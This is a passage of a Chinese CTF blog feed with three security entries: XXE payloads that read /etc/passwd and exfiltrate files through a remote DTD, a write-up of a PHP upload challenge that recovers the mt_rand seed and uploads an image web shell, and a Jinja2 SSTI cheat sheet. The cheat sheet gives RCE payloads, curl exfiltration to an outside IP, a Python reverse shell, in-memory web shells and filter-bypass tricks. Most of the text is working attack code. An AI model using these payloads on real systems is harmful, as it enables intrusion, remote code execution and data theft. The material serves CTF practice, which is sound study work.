class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><h2 id="SVG-格式">SVG 格式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;/etc/passwd&quot; &gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;</span><br><span class="line">&lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure><h2 id="数据外带">数据外带</h2><p>攻击服务器创建 shell.dtd：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://127.0.0.1:5555/?flag=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">%int;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://174.1.66.167/shell.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">%remote;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h2 id="xxe-绕过的-payload">xxe 绕过的 payload</h2><p>当只过滤了 SYSTEM，PUBLIC 等关键字时，可用双重实体编码绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE GVI [</span><br><span class="line"></span><br><span class="line">    &lt;!ENTITY % xml &quot;&amp;#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#46;&amp;#116;&amp;#120;&amp;#116;&amp;#34;&amp;#32;&amp;#62;&amp;#93;&amp;#62;&amp;#10;&amp;#60;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#60;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#38;&amp;#120;&amp;#120;&amp;#101;&amp;#59;&amp;#60;&amp;#47;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#10;&amp;#60;&amp;#47;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&quot;&gt;</span><br><span class="line"></span><br><span class="line">    %xml;</span><br></pre></td></tr></table></figure><p>即为在 xml 实体中再定义一次 xml，可成功被解析，支持 dtd 数据外带</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot; &gt;]&gt;</span><br><span class="line">&lt;core&gt;</span><br><span class="line">      &lt;message&gt;&amp;xxe;&lt;/message&gt;</span><br><span class="line">&lt;/core&gt;</span><br></pre></td></tr></table></figure><p>XXE 待复现<br>转自 <a href="https://wiki.wgpsec.org/knowledge/ctf/xxe.html">https://wiki.wgpsec.org/knowledge/ctf/xxe.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XXE&quot;&gt;XXE&lt;/h1&gt;
&lt;p&gt;XXE （PHP 5.45 之后不解析实体）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE 根标签名 SYSTEM &amp;quot;文件名&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;DTD 实体是用于定义引用文本</summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>[奇安信]Web-4-littledropbox</title>
    <link href="https://blog.hatchet.top/posts/89707270.html"/>
    <id>https://blog.hatchet.top/posts/89707270.html</id>
    <published>2024-09-18T15:31:42.000Z</published>
    <updated>2024-11-18T05:03:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="little-dropbox">little dropbox</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$uploadDir</span> = <span class="string">&quot;uploads/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>, <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>))) <span class="keyword">die</span>(<span class="string">&quot;nonono!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]), <span class="string">&#x27;&lt;?&#x27;</span>) !== False) <span class="keyword">die</span>(<span class="string">&quot;nonono!!!&quot;</span>);</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$info</span>[<span class="number">0</span>] !== <span class="number">100</span> || <span class="variable">$info</span>[<span class="number">1</span>] !== <span class="number">50</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$uploadDir</span> . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ready</span> = <span class="title function_ invoke__">filter_input</span>(INPUT_GET, <span class="string">&#x27;ready&#x27;</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">filter_input</span>(INPUT_GET, <span class="string">&#x27;key&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ready</span> === <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;secretKey&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;secretKey&quot;</span>] = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;secretKey&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//[0]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">225</span>; <span class="variable">$i</span>++) <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//[226]</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//[227]</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//[228]</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$key</span> === (<span class="keyword">string</span>)<span class="variable">$_SESSION</span>[<span class="string">&#x27;secretKey&#x27;</span>]) &#123;</span><br><span class="line">        <span class="title function_ invoke__">upload</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="解题思路">解题思路</h1><h2 id="构造伪随机数">构造伪随机数</h2><p>一开始需要构造 key 才能上传题目, 开始时考虑使用专门进行种子爆破的 php_mt_seed 工具<br>后来百度发现无需暴力破解就可以计算原始种子<br><a href="https://www.anquanke.com/post/id/196831">https://www.anquanke.com/post/id/196831</a><br>前提要求是给定间隔 227 个值的两个 mt_rand()输出结果，例如第 1 个和第 228 个 mt_rand()的输出结果<br>下载 mt_rand-reverse-master<br><a href="https://github.com/ambionics/mt_rand-reverse">https://github.com/ambionics/mt_rand-reverse</a><br>传参 127.0.0.1:100/upload.php?ready=1</p><pre><code>412630690&lt;br&gt;1046894031&lt;br&gt;1961239210&lt;br&gt;2006731948&lt;br&gt;Cookie:PHPSESSID=o065m8ssj0dakiv4iijtsp8sq6</code></pre><p>传第 0 个和第 227 个 mt_rand()值</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python reverse_mt_rand.py <span class="number">412630690</span> <span class="number">1961239210</span> <span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>得到 key 值 1955787332</p><h2 id="构造绕过-PHP-文件上传">构造绕过 PHP 文件上传</h2><p>使用文件名加点绕过<br>内容用 js 语言&lt;script language=“php”&gt;绕过<br>内容大小要求 100x50，使用 python 库 PIL 自动生成</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标上传的 URL</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:100/upload.php/?ready=1&amp;key=1955787332&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;o065m8ssj0dakiv4iijtsp8sq6&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造图片（100x50），并在图片数据中嵌入恶意 PHP 代码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_image_with_payload</span>():</span><br><span class="line">    <span class="comment"># 创建一个 100x50 的空白图片</span></span><br><span class="line">    img = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">100</span>, <span class="number">50</span>), color=(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">    img_byte_arr = BytesIO()</span><br><span class="line">    img.save(img_byte_arr, <span class="built_in">format</span>=<span class="string">&quot;PNG&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># PHP payload，嵌入到文件末尾</span></span><br><span class="line">    payload = <span class="string">b&quot;&lt;script language=\&quot;php\&quot;&gt;eval($_POST[&#x27;cmd&#x27;]);&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将图片数据和 payload 结合起来</span></span><br><span class="line">    img_data = img_byte_arr.getvalue() + payload</span><br><span class="line">    <span class="keyword">return</span> img_data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造上传请求</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="comment"># 生成带有 payload 的图片</span></span><br><span class="line">    img_data = create_image_with_payload()</span><br><span class="line">    filename = <span class="string">&quot;shell.php.&quot;</span></span><br><span class="line">    <span class="comment"># 构造文件参数</span></span><br><span class="line">    files = &#123;<span class="string">&quot;file&quot;</span>: (filename, img_data, <span class="string">&quot;image/png&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送 POST 请求，上传文件</span></span><br><span class="line">    response = requests.post(url, files=files, cookies=cookies)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出上传结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Response status:&quot;</span>, response.status_code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Response body:&quot;</span>, response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload_file()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后访问 127.0.0.1:100/uploads/md5($_SERVER[‘REMOTE_ADDR’])/shell.php 用蚁剑连接，密码为 cmd。</p><h2 id="另一种方法：-htaccess-文件绕过对上传图片的尺寸限制">另一种方法：.htaccess 文件绕过对上传图片的尺寸限制</h2><p>我们可以使用 WEBP 格式绕过<br>WBMP 图像的开头可以使用 # 设置图像的尺寸大小，这正符合我们的要求。题目限制我们上传的图片尺寸必须为 100x50，那么我们在上传.htaccess 时便可以用 WBMP 来绕过：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define width 100</span><br><span class="line">#define height 50</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>参考上文生成一个图片马，上传.htaccess 和 a.jpg, 上传 getshell</p>]]></content>
    
    
    <summary type="html">一道PHP文件上传+伪随机数绕过题</summary>
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
    <category term="PHP" scheme="https://blog.hatchet.top/tags/PHP/"/>
    
    <category term="刷题" scheme="https://blog.hatchet.top/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>各种ssti绕过及脚本</title>
    <link href="https://blog.hatchet.top/posts/301c82e9.html"/>
    <id>https://blog.hatchet.top/posts/301c82e9.html</id>
    <published>2024-08-29T13:44:29.000Z</published>
    <updated>2024-10-27T13:57:09.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="判断网站类型">判断网站类型</h1><h2 id="自己查找判断">自己查找判断</h2><ul><li>在页面或者抓包回复里有时会泄露类型</li></ul><h2 id="在疑似-ssti-处注入-7-7">在疑似 ssti 处注入 ${7*7}</h2><h3 id="有回显">有回显</h3><h4 id="a-comment-b">a{*comment*}b</h4><ul><li>ab -&gt; smarty</li></ul><h4 id="“z”-join-“ab”-z">${“z”.join(“ab”)}z</h4><ul><li>zab -&gt; mako</li></ul><h3 id="无回显">无回显</h3><h4 id="7-‘7’">{{7*‘7’}}</h4><ul><li>49 -&gt; Twig,smarty</li><li>7777777 -&gt; Jinja2 //最常见的 ssti 类型</li></ul><h1 id="各种类型">各种类型</h1><h2 id="Jinja2-python">Jinja2(python)</h2><h3 id="常规信息搜集">常规信息搜集</h3><p>{{config}}</p><p>{{self.__dict__}}</p><p>{{url_for.__globals__}}</p><ul><li>{{url_for.__globals__[‘current_app’].config[‘FLAG’]}}</li></ul><p>{{datetime}}</p><pre><code>{{a.__init__.__globals__.__builtins__.eval(&quot;__import__('os').popen('ls').read()&quot;)}}</code></pre><p>一个特解，不一定有效，如果有效可以直接实现 RCE</p><h3 id="利用危险类">利用危险类</h3><h4 id="利用-class-‘object’-进行注入">利用&lt;class ‘object’&gt;进行注入</h4><p>用这些可访问对象作为开头</p><pre><code>[]''&quot;&quot;()dictconfigrequest</code></pre><p>并用 base 或 mro 找到&lt;class ‘object’&gt;</p><pre><code>{{''.__class__.__bases__[0]}} // &lt;class 'object'&gt;{{''.__class__.__mro__[2]}}// &lt;class 'object'&gt;</code></pre><p>使用 subclasses 找到危险类</p><pre><code>{{''.__class__.__bases__[0].__subclasses__()[?]}}</code></pre><p>在？里填数字可以得到 对应的类，我们需要寻找危险类，它们能执行危险函数。<br>这里使用 os._wrap_close<br>跑脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node5.anna.nssctf.cn:20440/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">500</span>):</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">f&quot;&#123;&#123;&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[<span class="subst">&#123;i&#125;</span>]&#125;&#125;&#125;&#125;&quot;</span></span><br><span class="line">    <span class="comment"># GET</span></span><br><span class="line">    res = requests.get(url=url + <span class="string">f&quot;?name=<span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># POST</span></span><br><span class="line">    <span class="comment"># data = &#123;</span></span><br><span class="line">    <span class="comment">#     &quot;flag&quot;: payload,</span></span><br><span class="line">    <span class="comment"># &#125;</span></span><br><span class="line">    <span class="comment"># res = requests.post(url, data=data)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>拿到危险类后就可以随意构造了<br>这里跑出来值为 127</p><pre><code>#read&amp;write1.使用FileLoader(_frozen_importlib_external.FileLoader)读取{{''.__class__.__bases__[0].__subclasses__()[???][&quot;get_data&quot;](0,&quot;/etc/passwd&quot;)}}2.命令执行读取- open{{''.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['__builtins__'].eval(&quot;open('/etc/passwd').read()&quot;)}}- codecs{{''.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['__builtins__'].eval(&quot;__import__('codecs').open('/etc/passwd').read()&quot;)}}- pathlib{{''.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['__builtins__'].eval(&quot;__import__('pathlib').Path('/etc/passwd').read_text()&quot;)}}- io{{''.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['__builtins__'].eval(&quot;__import__('io').open('/etc/passwd').read()&quot;)}}#RCE{{''.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['popen']('ls').read()}}{{''.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__.eval(&quot;__import__('os').popen('ls').read()&quot;)}}#无回显使用curl命令带出数据{{config.__class__.__init__.__globals__['os'].popen('curl 120.46.41.173:9023/`ls /app/f*`').read()}}{{config.__class__.__init__.__globals__['os'].popen('curl 120.46.41.173:9023/`tac /app/fl4gfl4gfl4g`').read()}}#无回显反弹shell,把&quot;HOST_IP&quot;和Port换成自己的VPS地址{% for x in [].__class__.__base__.__subclasses__() %}    {% if x.__init__ is defined and x.__init__.__globals__ is defined and 'exec' in x.__init__.__globals__['__builtins__']['exec'].__name__ %}        {{ x.__init__.__globals__['__builtins__']['exec']('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;HOST_IP&quot;,Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)')}}    {% endif %}{% endfor %}{{().__class__.__bases__[0].__subclasses__()[216].__init__.__globals__['__builtins__']['exec']('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;HOST_IP&quot;,Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)')}}#无回显写内存马 写一次后就会爆500{{url_for.__globals__.current_app.add_url_rule('/114514',view_func=url_for.__globals__.__builtins__['__import__']('os').popen('cat /flag').read)}}{{url_for.__globals__['__builtins__']['eval'](&quot;app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())&quot;,{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})}}这个马可以传cmd参数</code></pre><h4 id="不使用-class-‘object’">不使用&lt;class ‘object’&gt;</h4><p><code>{{ request.__class__.__dict__ }}</code></p><ul><li>application</li><li>_load_form_data</li><li>on_json_loading_failed</li></ul><p><code>{{ config.__class__.__dict\__}}</code></p><ul><li>__init__</li><li>from_envvar</li><li>from_pyfile</li><li>from_object</li><li>from_file</li><li>from_json</li><li>from_mapping</li><li>get_namespace</li><li>__repr__</li></ul><p>如果有回显出以下的全局对象</p><pre><code># Read file{{ request.__class__._load_form_data.__globals__.__builtins__.open(&quot;/etc/passwd&quot;).read() }}# RCE{{ config.__class__.from_envvar.__globals__.__builtins__.__import__(&quot;os&quot;).popen(&quot;ls&quot;).read() }}{{ config.__class__.from_envvar[&quot;__globals__&quot;][&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;ls&quot;).read() }}{{ (config|attr(&quot;__class__&quot;)).from_envvar[&quot;__globals__&quot;][&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;ls&quot;).read() }}{% with a = request[&quot;application&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x5f\x5fbuiltins\x5f\x5f&quot;][&quot;\x5f\x5fimport\x5f\x5f&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;ls&quot;)[&quot;read&quot;]() %} {{ a }} {% endwith %}</code></pre><h3 id="一点关于-ssti-的绕过">一点关于 ssti 的绕过</h3><ul><li><strong>()即小括号是不可绕过的</strong></li></ul><h4 id="request-绕过-没被过滤全部可绕">request 绕过(没被过滤全部可绕)</h4><p>可以直接帮你绕过引号内的内容</p><pre><code>{{config.__class__.__init__.__globals__[request.args.os].popen(request.args.command).read()}}&amp;os=os&amp;command=cat /flag</code></pre><h4 id="chr-绕过-没被过滤全部可绕">chr 绕过(没被过滤全部可绕)</h4><p>先找到 chr 所需的危险类</p><pre><code>{%set chr = x.__init__.__globals__['__builtins__'].chr%}{{&quot;&quot;chr(46)+chr(95)+chr(95)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(95)+chr(95)+chr(46)+chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95)}}</code></pre><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$str</span>=<span class="string">&#x27;__class__.__bases__&#x27;</span>;</span><br><span class="line">    <span class="variable">$ans</span>=<span class="string">&#x27;chr(&#x27;</span>.<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="number">0</span>]).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$ans</span>.=<span class="string">&#x27;+chr(&#x27;</span>.<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$i</span>]).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ans</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="过滤了双大括号">过滤了双大括号{{}}</h4><p>{{…}} -&gt; {%print(…)%}</p><h4 id="过滤了下划线">过滤了下划线</h4><p>{{()|select|string}} 结果为<br>&lt;generator object select_or_reject at 0x7f7a6a450eb0&gt;<br>我们可以发现这里面出现了下划线，我们就可以造出下划线了<br>{{(()|select|string)[?]}}</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&lt;generator object select_or_reject at 0x7f7a6a450eb0&gt;&quot;</span></span><br><span class="line">pos = <span class="built_in">str</span>.find(<span class="string">&quot;_&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(pos)</span><br><span class="line">payload = <span class="string">f&quot;&#123;&#123;&#123;&#123;(()|select|string)[<span class="subst">&#123;pos&#125;</span>]&#125;&#125;&#125;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h4 id="过滤了-和">过滤了.和[]</h4><p>.过滤，用[]或者|attr()<br>.__class__.-&gt;[‘__class__’]-&gt;|attr(‘__class__’)<br>[]过滤了，用 pop 或者__getitem__</p><pre><code>{{''.__class__.__mro__.__getitem__(0)}}</code></pre><p>[40]-&gt;pop(40)</p><h4 id="过滤了-class-bases-等关键字">过滤了 class,bases 等关键字</h4><p>1.拼接</p><pre><code>{{''['__cl''ass__']['__mr''o__'][1]['__subc''lasses__']()[140]['__in''it__']['__glo''bals__']['popen']('ls').read()}}</code></pre><p>2.倒置<br>.__class__. -&gt; ‘’[‘__ssalc__’[::-1]]<br>3.格式化</p><pre><code>{%set ca=[&quot;{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}&quot;.format(95,95,99,108,97,115,115,95,95)]}{%set ca=[&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)]%}{%set ca='%c%c%c%c%c%c%c%c%c'%(95,95,99,108,97,115,115,95,95)%}</code></pre><p>这个没写脚本，用的有点少<br>4.编码绕过<br>（1）unicode<br>__class__-&gt;[‘\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f’]<br>编码可在 cyberchef 的 escape unicode characters 中找到<br>（2）hex<br>__class__-&gt;[‘\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f’]</p><h4 id="fenjing-一把梭">fenjing 一把梭</h4><p><a href="https://github.com/Marven11/Fenjing">https://github.com/Marven11/Fenjing</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fenjing webui</span><br></pre></td></tr></table></figure><h4 id="fenjing-python-破解脚本">fenjing python 破解脚本</h4><p>waf 黑名单生成 shell</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload, config_payload</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s: <span class="built_in">str</span></span>):  <span class="comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span></span><br><span class="line">    blacklist = [</span><br><span class="line">        <span class="string">&quot;config&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;class&quot;</span>, <span class="string">&quot;length&quot;</span>, <span class="string">&quot;mro&quot;</span>, <span class="string">&quot;base&quot;</span>, <span class="string">&quot;lipsum&quot;</span>,</span><br><span class="line">        <span class="string">&quot;[&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span 